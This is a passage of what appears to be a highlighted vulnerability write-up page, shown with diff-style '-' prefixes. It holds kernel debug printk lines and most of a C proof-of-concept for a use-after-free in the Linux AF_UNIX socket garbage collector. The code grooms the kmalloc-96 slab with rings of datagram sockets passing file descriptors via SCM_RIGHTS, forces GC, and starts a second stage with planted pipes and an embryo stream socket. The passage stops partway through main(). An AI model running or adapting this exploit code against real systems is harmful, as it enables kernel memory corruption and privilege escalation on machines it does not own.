-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;V %lu, SCC -&gt; %lu&#34;</span>, vertex<span style="color:#f92672">-&gt;</span>index, vertex<span style="color:#f92672">-&gt;</span>scc_index);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* after unix_update_graph(...) */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Updated: unix_graph_maybe_cyclic = %d, unix_graph_grouped = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>       unix_graph_maybe_cyclic, unix_graph_grouped);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* in __unix_walk_scc, inside the SCC finalise loop (after list_move_tail) */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;Vertex %lu, SCC -&gt; %lu&#34;</span>, v<span style="color:#f92672">-&gt;</span>index, v<span style="color:#f92672">-&gt;</span>scc_index);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* in unix_vertex_dead */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;total_ref: %lu, out_degree: %lu&#34;</span>, total_ref, vertex<span style="color:#f92672">-&gt;</span>out_degree);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* before returning true */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;vertex dead: True&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* in __unix_walk_scc and unix_walk_scc_fast, before unix_collect_skb() */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;[+] SCC DEAD Confirmed&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* in __unix_gc, before each walker */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;GC Fast&#34;</span>);   <span style="color:#75715e">/* fast path branch */</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;GC Slow&#34;</span>);   <span style="color:#75715e">/* slow path branch */</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: GPL-2.0
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * AF_UNIX GC UAF repro — advisory&#39;s three-stage scenario with the embryo sk-B.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Root cause: net/unix/garbage.c unix_add_edge() does not initialise
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * vertex-&gt;scc_index. A vertex freshly popped from the slab inherits whatever
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * scc_index the previous occupant wrote.  Stage 1 sprays freed vertices all
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * tagged with UNIX_VERTEX_INDEX_START (==2) — the value unix_walk_scc()
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * writes before freeing them in a cycle collection.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/un.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define N_CYCLE       100
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SPRAY_ROUNDS    1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define VICTIM_PIPES   64
-</span></span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">die</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s) { <span style="color:#a6e22e">perror</span>(s); <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>); }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">send_fd</span>(<span style="color:#66d9ef">int</span> sock, <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> sockaddr_un <span style="color:#f92672">*</span>dst, <span style="color:#66d9ef">socklen_t</span> dstlen)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> msghdr  msg <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> iovec   iov;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> cbuf[<span style="color:#a6e22e">CMSG_SPACE</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>))] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>cmsg;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    iov.iov_base <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>c; iov.iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    msg.msg_iov <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>iov; msg.msg_iovlen <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    msg.msg_control <span style="color:#f92672">=</span> cbuf; msg.msg_controllen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(cbuf);
-</span></span><span style="display:flex;"><span>    msg.msg_name <span style="color:#f92672">=</span> dst; msg.msg_namelen <span style="color:#f92672">=</span> dstlen;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    cmsg <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_FIRSTHDR</span>(<span style="color:#f92672">&amp;</span>msg);
-</span></span><span style="display:flex;"><span>    cmsg<span style="color:#f92672">-&gt;</span>cmsg_level <span style="color:#f92672">=</span> SOL_SOCKET;
-</span></span><span style="display:flex;"><span>    cmsg<span style="color:#f92672">-&gt;</span>cmsg_type  <span style="color:#f92672">=</span> SCM_RIGHTS;
-</span></span><span style="display:flex;"><span>    cmsg<span style="color:#f92672">-&gt;</span>cmsg_len   <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_LEN</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#a6e22e">CMSG_DATA</span>(cmsg), <span style="color:#f92672">&amp;</span>fd, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>));
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendmsg</span>(sock, <span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">recv_fd</span>(<span style="color:#66d9ef">int</span> sock)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> dummy;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> iovec iov <span style="color:#f92672">=</span> { .iov_base <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>dummy, .iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> };
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> cmsghdr cmsg;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> buf[<span style="color:#a6e22e">CMSG_SPACE</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">int</span>))];
-</span></span><span style="display:flex;"><span>    } u;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> msghdr msg <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>        .msg_iov        <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>iov,
-</span></span><span style="display:flex;"><span>        .msg_iovlen     <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
-</span></span><span style="display:flex;"><span>        .msg_control    <span style="color:#f92672">=</span> u.buf,
-</span></span><span style="display:flex;"><span>        .msg_controllen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(u.buf),
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">recvmsg</span>(sock, <span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>c <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_FIRSTHDR</span>(<span style="color:#f92672">&amp;</span>msg);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>c <span style="color:#f92672">||</span> c<span style="color:#f92672">-&gt;</span>cmsg_level <span style="color:#f92672">!=</span> SOL_SOCKET <span style="color:#f92672">||</span> c<span style="color:#f92672">-&gt;</span>cmsg_type <span style="color:#f92672">!=</span> SCM_RIGHTS)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>fd, <span style="color:#a6e22e">CMSG_DATA</span>(c), <span style="color:#66d9ef">sizeof</span>(fd));
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> fd;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> dgram_seq;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#66d9ef">struct</span> sockaddr_un <span style="color:#f92672">*</span>addr, <span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>alen)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> s <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (s <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;socket(dgram)&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(addr, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>addr));
-</span></span><span style="display:flex;"><span>    addr<span style="color:#f92672">-&gt;</span>sun_family <span style="color:#f92672">=</span> AF_UNIX;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(addr<span style="color:#f92672">-&gt;</span>sun_path <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">sizeof</span>(addr<span style="color:#f92672">-&gt;</span>sun_path) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>,
-</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">&#34;gc_%d_%d&#34;</span>, <span style="color:#a6e22e">getpid</span>(), dgram_seq<span style="color:#f92672">++</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>alen <span style="color:#f92672">=</span> <span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> sockaddr_un, sun_path) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">strlen</span>(addr<span style="color:#f92672">-&gt;</span>sun_path <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bind</span>(s, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)addr, <span style="color:#f92672">*</span>alen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;bind(dgram)&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Trigger __unix_gc without ever allocating a unix_vertex.  Closing a bare
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * AF_UNIX socket kicks unix_gc() from unix_release_sock() whenever
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * unix_tot_inflight &gt; 0.  We avoid send_fd() here — it kmallocs a vertex,
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * which after the walk pushes a non-scc_index=2 slot onto the freelist and
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * poisons the priming from stage 1.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">kick_gc</span>(<span style="color:#66d9ef">void</span>)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> s <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_DGRAM, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (s <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;kick_gc socket&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(s);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">usleep</span>(<span style="color:#ae81ff">200</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * One spray round: N_CYCLE DGRAM sockets wired into a single ring via
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * msg_name.  After every local fd is closed each socket has file_count==1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * (one inflight ref).  The ring survives until GC collects it, and every
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * collected vertex is tagged with scc_index = UNIX_VERTEX_INDEX_START (=2)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * before unix_free_vertices() frees it onto the kmalloc-96 freelist.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">spray_round</span>(<span style="color:#66d9ef">void</span>)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                <span style="color:#f92672">*</span>socks <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(N_CYCLE, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>socks));
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_un <span style="color:#f92672">*</span>addrs <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(N_CYCLE, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>addrs));
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">socklen_t</span>          <span style="color:#f92672">*</span>alens <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(N_CYCLE, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>alens));
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>socks <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>addrs <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>alens) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;calloc&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> N_CYCLE; i<span style="color:#f92672">++</span>)
-</span></span><span style="display:flex;"><span>        socks[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>addrs[i], <span style="color:#f92672">&amp;</span>alens[i]);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> N_CYCLE; i<span style="color:#f92672">++</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">send_fd</span>(socks[i], socks[i],
-</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>addrs[(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> N_CYCLE],
-</span></span><span style="display:flex;"><span>                    alens[(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> N_CYCLE]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;send_fd(spray)&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> N_CYCLE; i<span style="color:#f92672">++</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(socks[i]);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(alens); <span style="color:#a6e22e">free</span>(addrs); <span style="color:#a6e22e">free</span>(socks);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kick_gc</span>();
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">make_stream_listener</span>(<span style="color:#66d9ef">struct</span> sockaddr_un <span style="color:#f92672">*</span>addr, <span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>alen)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> s <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (s <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;socket(stream)&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(addr, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>addr));
-</span></span><span style="display:flex;"><span>    addr<span style="color:#f92672">-&gt;</span>sun_family <span style="color:#f92672">=</span> AF_UNIX;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(addr<span style="color:#f92672">-&gt;</span>sun_path <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">sizeof</span>(addr<span style="color:#f92672">-&gt;</span>sun_path) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>,
-</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">&#34;gc_lst_%d_%d&#34;</span>, <span style="color:#a6e22e">getpid</span>(), dgram_seq<span style="color:#f92672">++</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>alen <span style="color:#f92672">=</span> <span style="color:#a6e22e">offsetof</span>(<span style="color:#66d9ef">struct</span> sockaddr_un, sun_path) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">strlen</span>(addr<span style="color:#f92672">-&gt;</span>sun_path <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">bind</span>(s, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)addr, <span style="color:#f92672">*</span>alen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;bind(stream)&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">listen</span>(s, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;listen&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">connect_stream</span>(<span style="color:#66d9ef">struct</span> sockaddr_un <span style="color:#f92672">*</span>addr, <span style="color:#66d9ef">socklen_t</span> alen)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> s <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (s <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;socket(stream cli)&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">connect</span>(s, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)addr, alen) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;connect&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setvbuf</span>(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">signal</span>(SIGPIPE, SIG_IGN);      <span style="color:#75715e">/* write on a purged pipe → EPIPE, not kill */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* ========== Stage 1: prime kmalloc-96 with scc_index=2 residue ========= */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] stage 1: spray vertices (scc_index=2) via ring + GC&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> r <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; r <span style="color:#f92672">&lt;</span> SPRAY_ROUNDS; r<span style="color:#f92672">++</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">spray_round</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* ========== Stage 2: sk-A → embryo sk-B ; sk-X → sk-X ; slow GC ======== */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] stage 2: sk-A→embryo(sk-B), sk-X→sk-X, GC&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_un bAddr; <span style="color:#66d9ef">socklen_t</span> bLen;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> listener    <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_stream_listener</span>(<span style="color:#f92672">&amp;</span>bAddr, <span style="color:#f92672">&amp;</span>bLen);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> client_to_B <span style="color:#f92672">=</span> <span style="color:#a6e22e">connect_stream</span>(<span style="color:#f92672">&amp;</span>bAddr, bLen);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_un aAddr; <span style="color:#66d9ef">socklen_t</span> aLen;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> skA <span style="color:#f92672">=</span> <span style="color:#a6e22e">make_dgram</span>(<span style="color:#f92672">&amp;</span>aAddr, <span style="color:#f92672">&amp;</span>aLen);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Plant pipe read-ends in sk-A&#39;s queue BEFORE sk-A goes inflight.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Pipes are non-AF_UNIX → zero vertex kmallocs → freelist untouched. */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> pipe_write[VICTIM_PIPES];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> n_planted <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> big <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">20</span>;
